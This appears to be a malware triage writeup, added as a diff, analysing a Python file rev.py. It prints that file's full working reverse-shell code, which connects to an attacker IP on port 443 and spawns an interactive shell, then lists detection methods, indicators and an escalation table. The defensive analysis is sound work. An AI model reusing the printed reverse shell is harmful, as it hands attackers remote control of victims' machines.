@@ -1,0 +1,66 @@
+Python script (identified by .py extension and Python syntax)
+Code Analysis:
+
+
+import socket
+import subprocess
+import os
+
+hacker_ip = "192.168.45.205"  # Attacker's C2 server
+port = 443  # HTTPS port for stealth
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((hacker_ip, port))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+p = subprocess.call(["/bin/sh", "-i"])
+
+
+
+
+
+Malicious Behavior:
+Reverse shell implementation that:
+
+Creates connection back to attacker (192.168.45.205)
+
+Uses port 443 (common for C2 to blend with HTTPS traffic)
+
+Duplicates file descriptors to redirect I/O
+
+Spawns interactive shell (/bin/sh -i)
+
+Detection Methods:
+
+Network monitoring for unexpected outbound connections to 192.168.45.205:443
+
+Process monitoring for Python spawning shells
+
+File integrity monitoring for new Python scripts
+
+EDR solutions watching for socket+subprocess combinations
+
+Key Indicators:
+Attacker IP: 192.168.45.205
+
+C2 Port: 443 (HTTPS)
+
+Payload: Interactive reverse shell
+
+
+
+
+
+Immediate escalation because:
+
+Confirmed malicious behavior (reverse shell)
+
+Active C2 infrastructure identified
+
+High impact potential (remote code execution)
+
+Comparative Risk Assessment
+File	Risk Level	Reason for Escalation
+Defeat.bat	Medium	Unknown purpose, needs deep analysis
+rev.py	Critical	Confirmed reverse shell implant
